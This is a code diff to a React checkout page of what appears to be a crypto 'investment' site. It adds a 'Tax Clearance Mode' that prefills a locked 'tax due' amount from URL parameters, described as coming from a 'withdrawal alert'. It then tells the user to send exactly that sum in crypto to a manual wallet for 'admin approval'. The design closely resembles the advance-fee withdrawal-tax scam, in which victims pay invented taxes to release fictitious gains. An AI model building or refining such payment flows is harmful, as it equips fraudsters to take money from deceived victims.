@@ -224,6 +224,22 @@ export default function CheckoutPage() {
   const [waitNow, setWaitNow] = useState(Date.now());
   const [confirmed, setConfirmed] = useState(false);
   const [errors, setErrors] = useState({});
+  const taxPrefill = useMemo(() => {
+    try {
+      const q = new URLSearchParams(window.location.search || "");
+      const mode = String(q.get("mode") || "").toLowerCase();
+      const amount = Number(q.get("amount") || "");
+      const currency = String(q.get("currency") || "GBP").toUpperCase();
+      const validCurrency = currency === "GBP" || currency === "USD" || currency === "EUR";
+      return {
+        enabled: mode === "tax" && Number.isFinite(amount) && amount > 0,
+        amount: Number.isFinite(amount) && amount > 0 ? Number(amount.toFixed(2)) : 0,
+        currency: validCurrency ? currency : "GBP"
+      };
+    } catch {
+      return { enabled: false, amount: 0, currency: "GBP" };
+    }
+  }, []);
 
   const selectedNetwork = useMemo(
     () => NETWORK_OPTIONS.find((x) => x.id === networkId) || NETWORK_OPTIONS[0],
@@ -237,17 +253,22 @@ export default function CheckoutPage() {
     () => WALLET_BY_NETWORK[networkId] || "",
     [networkId]
   );
-  const baseAmount = useMemo(() => {
+  const packageAmount = useMemo(() => {
     const raw = Number(selectedPackage?.amountValue || 0);
     return Number.isFinite(raw) && raw > 0 ? raw : 0;
   }, [selectedPackage]);
-  const baseAsset = useMemo(
+  const packageAsset = useMemo(
     () => String(selectedPackage?.amountAsset || "EUR").toUpperCase(),
     [selectedPackage]
   );
+  const baseAmount = taxPrefill.enabled ? taxPrefill.amount : packageAmount;
+  const baseAsset = taxPrefill.enabled ? taxPrefill.currency : packageAsset;
   const checkoutReference = useMemo(
-    () => `TF-${String(selectedPackage?.id || "PKG").toUpperCase()}-${selectedNetwork.id}-${String(baseAmount || 0)}`,
-    [selectedPackage, selectedNetwork, baseAmount]
+    () =>
+      taxPrefill.enabled
+        ? `TF-TAX-${selectedNetwork.id}-${String(baseAmount || 0)}`
+        : `TF-${String(selectedPackage?.id || "PKG").toUpperCase()}-${selectedNetwork.id}-${String(baseAmount || 0)}`,
+    [taxPrefill.enabled, selectedPackage, selectedNetwork, baseAmount]
   );
   const isQuoteReady = Boolean(!quoteLoading && quoteSource && quoteSource !== "compat" && !quoteError && Number(btcAmount) > 0);
   const waitElapsedSec = useMemo(() => {
@@ -282,8 +303,8 @@ export default function CheckoutPage() {
   function runValidation() {
     const next = {};
     if (!fullName.trim()) next.fullName = "Full name is required.";
-    if (!packageId) next.packageId = "Select a package plan.";
-    if (!Number.isFinite(baseAmount) || baseAmount <= 0) next.btcAmount = "A valid package amount is required.";
+    if (!taxPrefill.enabled && !packageId) next.packageId = "Select a package plan.";
+    if (!Number.isFinite(baseAmount) || baseAmount <= 0) next.btcAmount = "A valid amount is required.";
     if (!networkId) next.networkId = "Select a blockchain network.";
     if (!selectedWalletAddress) next.networkId = "No wallet address configured for this network.";
     if (quoteLoading) next.btcAmount = "Please wait while we fetch your conversion quote.";
@@ -393,7 +414,9 @@ export default function CheckoutPage() {
         method: "Crypto Manual Wallet",
         chain: selectedNetwork.chain || "BTC",
         reference: `checkout-${Date.now()}`,
-        note: `Manual invest for ${fullName} | country=${country} | package=${selectedPackage?.id || "n/a"} | network=${selectedNetwork.label} | wallet=${selectedWalletAddress}`
+        note: taxPrefill.enabled
+          ? `Manual tax clearance for ${fullName} | country=${country} | tax=${baseAmount} ${baseAsset} | network=${selectedNetwork.label} | wallet=${selectedWalletAddress}`
+          : `Manual invest for ${fullName} | country=${country} | package=${selectedPackage?.id || "n/a"} | network=${selectedNetwork.label} | wallet=${selectedWalletAddress}`
       });
       const finalAmount = Number(j?.request?.amount);
       if (Number.isFinite(finalAmount) && finalAmount > 0) setBtcAmount(String(finalAmount));
@@ -1036,7 +1059,7 @@ export default function CheckoutPage() {
                 <p className="subtle" style={{ fontStyle: "italic", marginTop: 4 }}>Blockchain-first, secure, and operator-verified settlement.</p>
                 <div style={{ marginTop: 8, display: "inline-flex", alignItems: "center", gap: 8, border: "1px solid #bbf7d0", background: "#f0fdf4", color: "#166534", borderRadius: 999, padding: "6px 10px", fontSize: 12, fontWeight: 700 }}>
                   <span style={{ width: 8, height: 8, borderRadius: 999, background: "#16a34a" }} />
-                  Professional Invest Mode
+                  {taxPrefill.enabled ? "Tax Clearance Mode" : "Professional Invest Mode"}
                 </div>
                 <div className="checkoutProgressWrap" aria-label="Checkout progress">
                   <div className="checkoutProgressHead">
@@ -1098,23 +1121,33 @@ export default function CheckoutPage() {
                     <h3 className="sectionTitle">Payment Details</h3>
                     <div className="formGrid">
                       <div>
-                        <label style={{ display: "block", marginBottom: 6, fontSize: 14, fontWeight: 500, color: "#374151" }}>Package Plan</label>
+                        <label style={{ display: "block", marginBottom: 6, fontSize: 14, fontWeight: 500, color: "#374151" }}>
+                          {taxPrefill.enabled ? "Tax Amount (Auto-filled)" : "Package Plan"}
+                        </label>
                         <div className="networkDesigner">
                           <div className="networkDesignerHead">
-                            <div className="networkGlyph">{(selectedPackage?.icon || "P").slice(0, 2)}</div>
+                            <div className="networkGlyph">{taxPrefill.enabled ? "TX" : (selectedPackage?.icon || "P").slice(0, 2)}</div>
                             <div>
-                              <div className="networkHeadTitle">{selectedPackage?.pool} - {selectedPackage?.name}</div>
-                              <div className="networkHeadSub">{selectedPackage?.desc}</div>
+                              <div className="networkHeadTitle">
+                                {taxPrefill.enabled ? "Tax Clearance Payment" : `${selectedPackage?.pool} - ${selectedPackage?.name}`}
+                              </div>
+                              <div className="networkHeadSub">
+                                {taxPrefill.enabled ? `Auto-filled from withdrawal alert: ${baseAmount} ${baseAsset}` : selectedPackage?.desc}
+                              </div>
                             </div>
                           </div>
                           <div className="networkSelectWrap">
-                            <select className="networkSelect" value={packageId} onChange={(e) => setPackageId(e.target.value)}>
-                              {ITEMS.map((it) => (
-                                <option key={it.id} value={it.id}>
-                                  {it.pool} - {it.name} ({it.deposit})
-                                </option>
-                              ))}
-                            </select>
+                            {taxPrefill.enabled ? (
+                              <input className="networkSelect" value={`${baseAmount} ${baseAsset}`} readOnly aria-readonly="true" />
+                            ) : (
+                              <select className="networkSelect" value={packageId} onChange={(e) => setPackageId(e.target.value)}>
+                                {ITEMS.map((it) => (
+                                  <option key={it.id} value={it.id}>
+                                    {it.pool} - {it.name} ({it.deposit})
+                                  </option>
+                                ))}
+                              </select>
+                            )}
                             <span className="networkSelectIcon" aria-hidden="true">
                               <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2">
                                 <path d="M7 10l5 5 5-5" />
@@ -1122,11 +1155,20 @@ export default function CheckoutPage() {
                             </span>
                           </div>
                           <div className="networkMetaRow">
-                            <span className="networkChip">Deposit: {selectedPackage?.deposit}</span>
-                            <span className="networkChip">Target: {selectedPackage?.target}</span>
+                            {taxPrefill.enabled ? (
+                              <>
+                                <span className="networkChip">Tax Due: {baseAmount} {baseAsset}</span>
+                                <span className="networkChip">Purpose: Tax Clearance</span>
+                              </>
+                            ) : (
+                              <>
+                                <span className="networkChip">Deposit: {selectedPackage?.deposit}</span>
+                                <span className="networkChip">Target: {selectedPackage?.target}</span>
+                              </>
+                            )}
                           </div>
                         </div>
-                        {errors.packageId ? <div className="fieldError">{errors.packageId}</div> : null}
+                        {!taxPrefill.enabled && errors.packageId ? <div className="fieldError">{errors.packageId}</div> : null}
                       </div>
                       <div>
                         <label style={{ display: "block", marginBottom: 6, fontSize: 14, fontWeight: 500, color: "#374151" }}>Blockchain Network</label>
@@ -1177,7 +1219,7 @@ export default function CheckoutPage() {
                           </button>
                         </div>
                         <div className="quoteRows">
-                          <div className="quoteRow"><span className="quoteKey">From package</span><span className="quoteVal">{baseAmount} {baseAsset}</span></div>
+                          <div className="quoteRow"><span className="quoteKey">{taxPrefill.enabled ? "Tax amount" : "From package"}</span><span className="quoteVal">{baseAmount} {baseAsset}</span></div>
                           <div className="quoteRow"><span className="quoteKey">To pay</span><span className="quoteVal">{btcAmount || "--"} {selectedNetwork.asset}</span></div>
                           <div className="quoteRow"><span className="quoteKey">Checkout reference</span><span className="quoteVal">{checkoutReference}</span></div>
                         </div>
@@ -1192,6 +1234,9 @@ export default function CheckoutPage() {
                     <div className="checkItem"><span className="checkDot">1</span><span>{fullName.trim() ? "Name captured" : "Add your full name"}</span></div>
                     <div className="checkItem"><span className="checkDot">2</span><span>{networkId ? `Network set: ${selectedNetwork.label}` : "Select blockchain network"}</span></div>
                     <div className="checkItem"><span className="checkDot">3</span><span>{isQuoteReady ? "Server quote locked" : "Waiting for live server quote"}</span></div>
+                    {taxPrefill.enabled ? (
+                      <div className="checkItem"><span className="checkDot">4</span><span>Tax amount is locked for admin verification flow.</span></div>
+                    ) : null}
                   </div>
 
                   <button type="submit" className="payBtn" disabled={loading || quoteLoading || !quoteSource || quoteSource === "compat"}>
@@ -1202,7 +1247,7 @@ export default function CheckoutPage() {
                             <rect x="4" y="11" width="16" height="10" rx="2" />
                             <path d="M8 11V8a4 4 0 118 0v3" />
                           </svg>
-                          Invest ({selectedNetwork.label})
+                          {taxPrefill.enabled ? `Pay Tax (${selectedNetwork.label})` : `Invest (${selectedNetwork.label})`}
                         </>
                       ) : (
                         <span className="spinner" />
@@ -1238,8 +1283,12 @@ export default function CheckoutPage() {
                     <circle cx="48" cy="48" r="34" className="drawCircle" fill="none" stroke="#16a34a" strokeWidth="4" />
                     <path d="M32 49l11 11 21-21" className="drawCheck" fill="none" stroke="#16a34a" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
                   </svg>
-                  <h2>Invest Session Ready</h2>
-                  <p>Send exactly the amount below to the selected wallet address, then check your deposit status.</p>
+                  <h2>{taxPrefill.enabled ? "Tax Payment Session Ready" : "Invest Session Ready"}</h2>
+                  <p>
+                    {taxPrefill.enabled
+                      ? "Send exactly the tax amount below to the selected wallet address, then check your status for admin approval."
+                      : "Send exactly the amount below to the selected wallet address, then check your deposit status."}
+                  </p>
                   <div className="walletCard">
                     <div className="walletHead">
                       <span>Wallet Address ({selectedNetwork.label})</span>
